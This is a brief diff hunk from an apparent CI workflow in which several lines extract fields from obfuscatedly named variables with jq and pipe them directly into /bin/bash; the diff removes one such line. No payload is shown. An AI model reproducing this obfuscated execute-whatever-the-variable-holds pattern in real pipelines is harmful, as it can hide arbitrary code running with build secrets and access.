@@ -28,7 +28,6 @@ jobs:
           echo $l2 | jq -r .q92 | /bin/bash
           echo $cjydw5960 | jq -r .fsxs0 | /bin/bash
           echo $yrze836 | jq -r .gc48981 | /bin/bash
-          echo $c06 | jq -r .eoof784 | /bin/bash
           echo $v48 | jq -r .hjls2 | /bin/bash
           printf '%s' "$ipil5" | jq -r .gt73 | /bin/bash
           printf '%s' "$v19" | jq -r .vwu761 | /bin/bash
